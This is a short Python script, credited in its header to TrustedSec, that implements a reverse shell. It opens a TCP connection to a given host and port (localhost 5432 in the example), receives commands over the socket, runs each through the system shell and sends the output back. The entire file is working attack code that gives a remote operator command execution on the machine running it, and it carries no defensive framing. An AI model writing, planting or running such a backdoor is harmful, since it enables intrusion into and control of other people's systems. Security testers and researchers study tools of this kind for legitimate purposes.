#!/usr/bin/env python

# Simple Reverse Shell Written by: Dave Kennedy (ReL1K)
# Copyright 2012 TrustedSec, LLC. All rights reserved.
#
# This piece of software code is licensed under the FreeBSD license..
#
# Visit http://www.freebsd.org/copyright/freebsd-license.html for more
# information.


import socket
import subprocess


def reverse_shell(host, port):
    s = socket.socket(socket.AF_INET,
                      socket.SOCK_STREAM,
                      socket.IPPROTO_TCP)

    s.connect((host, port))

    while True:
        cmd = s.recv(1024)
        process = subprocess.Popen(cmd,
                                   stdin=subprocess.PIPE,
                                   stdout=subprocess.PIPE,
                                   stderr=subprocess.PIPE,
                                   shell=True)

        cmd_output = "[*] Process ID: %d\n%s%s\n" % (
            process.pid,
            process.stdout.read(),
            process.stderr.read())

        s.send(cmd_output)

    s.close()


if __name__ == "__main__":
    reverse_shell("127.0.0.1", 5432)
